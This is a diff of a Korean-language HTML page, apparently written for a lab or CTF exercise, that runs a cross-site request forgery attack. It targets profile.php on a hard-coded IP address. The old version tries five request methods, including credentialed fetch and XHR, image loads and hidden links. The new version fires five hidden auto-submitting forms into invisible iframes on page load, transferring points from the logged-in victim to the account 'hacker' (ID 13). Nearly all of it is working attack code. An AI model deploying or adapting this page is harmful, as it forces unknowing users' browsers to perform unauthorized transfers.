@@ -2,239 +2,184 @@
 <html lang="ko">
 <head>
     <meta charset="UTF-8">
-    <title>🎁 CSRF 우회 공격</title>
+    <title>🎯 정확한 CSRF 공격</title>
     <style>
         body { 
             font-family: Arial; 
             padding: 30px;
-            background: linear-gradient(135deg, #667eea, #764ba2);
-            color: white;
+            background: linear-gradient(135deg, #ff9a9e, #fecfef);
+            color: #333;
             text-align: center;
         }
-        .attack-container {
-            background: rgba(0, 0, 0, 0.8);
-            border: 3px solid #00ff00;
+        .attack-box {
+            background: rgba(255, 255, 255, 0.95);
+            border: 3px solid #ff6b6b;
             padding: 40px;
             margin: 20px auto;
             border-radius: 20px;
-            max-width: 800px;
-            box-shadow: 0 0 30px rgba(0, 255, 0, 0.3);
+            max-width: 700px;
+            box-shadow: 0 0 20px rgba(255, 107, 107, 0.3);
         }
         .status {
-            background: rgba(255, 255, 255, 0.1);
+            background: #f8f9fa;
+            border-left: 4px solid #28a745;
             padding: 15px;
-            border-radius: 10px;
             margin: 15px 0;
-            font-size: 16px;
+            border-radius: 5px;
         }
-        .method {
-            background: rgba(255, 193, 7, 0.2);
+        .attack-item {
+            background: #fff3cd;
+            border: 1px solid #ffeaa7;
             padding: 10px;
             margin: 10px 0;
             border-radius: 5px;
-            border-left: 4px solid #ffc107;
         }
     </style>
 </head>
 <body>
-    <div class="attack-container">
-        <h1>🔥 고급 CSRF 우회 공격</h1>
-        <h2>🎯 다중 방식으로 ID=13 공격 중...</h2>
+    <div class="attack-box">
+        <h1>🎯 정밀 CSRF 공격 실행</h1>
+        <h2>📊 Network 분석 완료 - 실제 파라미터 사용</h2>
         
         <div id="status" class="status">
-            ⏳ 공격 준비 중...
+            🔍 분석된 파라미터로 공격 준비 중...
         </div>
         
-        <div id="methods"></div>
+        <div id="attacks"></div>
         <div id="results"></div>
     </div>
 
+    <!-- 정확한 폼 구조로 숨겨진 공격 폼들 -->
+    <form id="attack1" action="http://3.36.66.216/profile.php?gift_to=13" method="POST" target="frame1" style="display:none;">
+        <input type="hidden" name="send_gift" value="1">
+        <input type="hidden" name="receiver_id" value="13">
+        <input type="hidden" name="gift_type" value="coffee">
+        <input type="hidden" name="points" value="100">
+        <input type="hidden" name="message" value="생일축하해!">
+    </form>
+
+    <form id="attack2" action="http://3.36.66.216/profile.php?gift_to=13" method="POST" target="frame2" style="display:none;">
+        <input type="hidden" name="send_gift" value="1">
+        <input type="hidden" name="receiver_id" value="13">
+        <input type="hidden" name="gift_type" value="flower">
+        <input type="hidden" name="points" value="150">
+        <input type="hidden" name="message" value="꽃선물이야~">
+    </form>
+
+    <form id="attack3" action="http://3.36.66.216/profile.php?gift_to=13" method="POST" target="frame3" style="display:none;">
+        <input type="hidden" name="send_gift" value="1">
+        <input type="hidden" name="receiver_id" value="13">
+        <input type="hidden" name="gift_type" value="cake">
+        <input type="hidden" name="points" value="200">
+        <input type="hidden" name="message" value="케이크먹어">
+    </form>
+
+    <form id="attack4" action="http://3.36.66.216/profile.php?gift_to=13" method="POST" target="frame4" style="display:none;">
+        <input type="hidden" name="send_gift" value="1">
+        <input type="hidden" name="receiver_id" value="13">
+        <input type="hidden" name="gift_type" value="diamond">
+        <input type="hidden" name="points" value="250">
+        <input type="hidden" name="message" value="다이아몬드!">
+    </form>
+
+    <form id="attack5" action="http://3.36.66.216/profile.php?gift_to=13" method="POST" target="frame5" style="display:none;">
+        <input type="hidden" name="send_gift" value="1">
+        <input type="hidden" name="receiver_id" value="13">
+        <input type="hidden" name="gift_type" value="coffee">
+        <input type="hidden" name="points" value="300">
+        <input type="hidden" name="message" value="또보내!">
+    </form>
+
+    <!-- 숨겨진 iframe들 -->
+    <iframe name="frame1" style="display:none;"></iframe>
+    <iframe name="frame2" style="display:none;"></iframe>
+    <iframe name="frame3" style="display:none;"></iframe>
+    <iframe name="frame4" style="display:none;"></iframe>
+    <iframe name="frame5" style="display:none;"></iframe>
+
     <script>
-        let methods = [
-            {name: "직접 fetch 공격", type: "fetch"},
-            {name: "XMLHttpRequest 공격", type: "xhr"}, 
-            {name: "동적 폼 생성 공격", type: "form"},
-            {name: "이미지 태그 공격", type: "img"},
-            {name: "링크 클릭 시뮬레이션", type: "link"}
+        let attackCount = 0;
+        let totalAttacks = 5;
+        let totalPoints = 0;
+
+        const attacks = [
+            {id: 'attack1', type: 'coffee', points: 100, message: '생일축하해!'},
+            {id: 'attack2', type: 'flower', points: 150, message: '꽃선물이야~'},
+            {id: 'attack3', type: 'cake', points: 200, message: '케이크먹어'},
+            {id: 'attack4', type: 'diamond', points: 250, message: '다이아몬드!'},
+            {id: 'attack5', type: 'coffee', points: 300, message: '또보내!'}
         ];
-        
-        let results = [];
-        let currentMethod = 0;
 
         function updateStatus(message) {
             document.getElementById('status').innerHTML = message;
         }
 
-        function updateMethods() {
-            let html = '<h3>🔧 시도할 공격 방법들:</h3>';
-            methods.forEach((method, index) => {
+        function updateAttacks() {
+            let html = '<h3>🚀 실행 중인 공격들:</h3>';
+            attacks.forEach((attack, index) => {
                 let status = '';
-                if (index < currentMethod) status = ' ✅';
-                else if (index === currentMethod) status = ' 🔄';
-                else status = ' ⏳';
+                if (index < attackCount) status = ' ✅ 완료';
+                else if (index === attackCount) status = ' 🔄 진행중';
+                else status = ' ⏳ 대기';
                 
-                html += `<div class="method">${method.name}${status}</div>`;
+                html += `<div class="attack-item">
+                    ${attack.type} 선물 (${attack.points}P) → hacker${status}
+                </div>`;
             });
-            document.getElementById('methods').innerHTML = html;
+            document.getElementById('attacks').innerHTML = html;
         }
 
         function updateResults() {
-            let html = '<h3>📊 공격 결과:</h3>';
-            results.forEach(result => {
-                html += `<div class="status">${result}</div>`;
-            });
-            document.getElementById('results').innerHTML = html;
+            document.getElementById('results').innerHTML = `
+                <div class="status">
+                    <h3>📊 현재 진행상황</h3>
+                    <p><strong>완료된 공격:</strong> ${attackCount}/${totalAttacks}</p>
+                    <p><strong>전송 포인트:</strong> ${totalPoints}P</p>
+                    <p><strong>대상:</strong> hacker (ID: 13)</p>
+                    <p><strong>공격자:</strong> bob (현재 로그인 사용자)</p>
+                </div>
+            `;
         }
 
-        // 방법 1: Fetch API
-        async function fetchAttack() {
-            try {
-                const formData = new FormData();
-                formData.append('gift_type', 'coffee');
-                formData.append('points', '100');
-                formData.append('message', 'fetch공격');
-                formData.append('gift_to', '13');
-
-                const response = await fetch('http://3.36.66.216/profile.php', {
-                    method: 'POST',
-                    body: formData,
-                    credentials: 'include',
-                    mode: 'no-cors'
-                });
+        function executeAttack(attackIndex, delay) {
+            setTimeout(() => {
+                const attack = attacks[attackIndex];
+                document.getElementById(attack.id).submit();
                 
-                results.push('🚀 Fetch 공격: 전송 완료 (응답 확인 불가)');
-                console.log('[FETCH] 공격 전송됨');
-            } catch (error) {
-                results.push('❌ Fetch 공격: ' + error.message);
-                console.log('[FETCH] 오류:', error);
-            }
-        }
-
-        // 방법 2: XMLHttpRequest
-        function xhrAttack() {
-            try {
-                const xhr = new XMLHttpRequest();
-                const formData = new FormData();
-                formData.append('gift_type', 'flower');
-                formData.append('points', '150');
-                formData.append('message', 'xhr공격');
-                formData.append('gift_to', '13');
-
-                xhr.open('POST', 'http://3.36.66.216/profile.php', true);
-                xhr.withCredentials = true;
+                attackCount++;
+                totalPoints += attack.points;
                 
-                xhr.onreadystatechange = function() {
-                    if (xhr.readyState === 4) {
-                        results.push('🚀 XHR 공격: 완료 (상태: ' + xhr.status + ')');
-                        updateResults();
-                    }
-                };
-                
-                xhr.send(formData);
-                console.log('[XHR] 공격 전송됨');
-            } catch (error) {
-                results.push('❌ XHR 공격: ' + error.message);
-                console.log('[XHR] 오류:', error);
-            }
-        }
-
-        // 방법 3: 동적 폼 생성
-        function dynamicFormAttack() {
-            try {
-                const form = document.createElement('form');
-                form.method = 'POST';
-                form.action = 'http://3.36.66.216/profile.php';
-                
-                const fields = {
-                    'gift_type': 'cake',
-                    'points': '200',
-                    'message': '폼공격',
-                    'gift_to': '13'
-                };
-
-                Object.keys(fields).forEach(key => {
-                    const input = document.createElement('input');
-                    input.type = 'hidden';
-                    input.name = key;
-                    input.value = fields[key];
-                    form.appendChild(input);
-                });
-
-                document.body.appendChild(form);
-                form.submit();
-                
-                results.push('🚀 동적 폼 공격: 제출 완료');
-                console.log('[FORM] 동적 폼 제출됨');
-            } catch (error) {
-                results.push('❌ 동적 폼 공격: ' + error.message);
-                console.log('[FORM] 오류:', error);
-            }
-        }
-
-        // 방법 4: 이미지 태그 (GET 요청)
-        function imageAttack() {
-            try {
-                const img = new Image();
-                img.src = 'http://3.36.66.216/profile.php?gift_type=diamond&points=250&message=img공격&gift_to=13';
-                img.onload = () => results.push('🚀 이미지 공격: 로드 완료');
-                img.onerror = () => results.push('⚠️ 이미지 공격: 에러 (하지만 요청은 전송됨)');
-                
-                console.log('[IMG] 이미지 요청 전송됨');
-            } catch (error) {
-                results.push('❌ 이미지 공격: ' + error.message);
-                console.log('[IMG] 오류:', error);
-            }
-        }
-
-        // 방법 5: 숨겨진 링크 클릭
-        function linkAttack() {
-            try {
-                const link = document.createElement('a');
-                link.href = 'http://3.36.66.216/profile.php?gift_type=coffee&points=300&message=link공격&gift_to=13';
-                link.target = '_blank';
-                link.style.display = 'none';
-                document.body.appendChild(link);
-                link.click();
-                
-                results.push('🚀 링크 공격: 클릭 완료');
-                console.log('[LINK] 링크 클릭됨');
-            } catch (error) {
-                results.push('❌ 링크 공격: ' + error.message);
-                console.log('[LINK] 오류:', error);
-            }
-        }
-
-        // 순차적으로 모든 공격 실행
-        async function executeAllAttacks() {
-            updateStatus('🔥 다중 CSRF 공격 시작...');
-            updateMethods();
-
-            const attacks = [fetchAttack, xhrAttack, dynamicFormAttack, imageAttack, linkAttack];
-
-            for (let i = 0; i < attacks.length; i++) {
-                currentMethod = i;
-                updateMethods();
-                updateStatus(`🚀 ${methods[i].name} 실행 중...`);
-
-                try {
-                    await attacks[i]();
-                } catch (error) {
-                    console.error(`공격 ${i+1} 오류:`, error);
-                }
-
+                updateStatus(`🚀 ${attack.type} 선물 (${attack.points}P) 전송 완료!`);
+                updateAttacks();
                 updateResults();
-                await new Promise(resolve => setTimeout(resolve, 2000)); // 2초 대기
-            }
-
-            currentMethod = attacks.length;
-            updateMethods();
-            updateStatus('🎉 모든 공격 완료! 결과를 확인하세요.');
+                
+                console.log(`[CSRF] 공격 ${attackCount}: ${attack.type} → ID=13, ${attack.points}P`);
+                
+                if (attackCount === totalAttacks) {
+                    setTimeout(() => {
+                        updateStatus(`
+                            🎉 모든 CSRF 공격 완료!<br>
+                            💰 총 ${totalPoints}P가 hacker에게 전송되었습니다!<br>
+                            🔍 지금 포인트 변화를 확인해보세요!
+                        `);
+                    }, 1000);
+                }
+            }, delay);
         }
 
-        // 페이지 로드 시 자동 실행
+        // 페이지 로드 후 자동 실행
         window.addEventListener('load', function() {
-            console.log('🔥 고급 CSRF 공격 시작');
-            executeAllAttacks();
+            updateStatus('🔥 정밀 CSRF 공격 시작...');
+            updateAttacks();
+            updateResults();
+            
+            // 5개 공격을 2초 간격으로 순차 실행
+            attacks.forEach((attack, index) => {
+                executeAttack(index, (index + 1) * 2000);
+            });
+            
+            console.log('🎯 Network 분석 기반 CSRF 공격 시작됨');
+            console.log('📋 사용된 파라미터: send_gift=1, receiver_id=13, gift_type, points, message');
         });
     </script>
 </body>
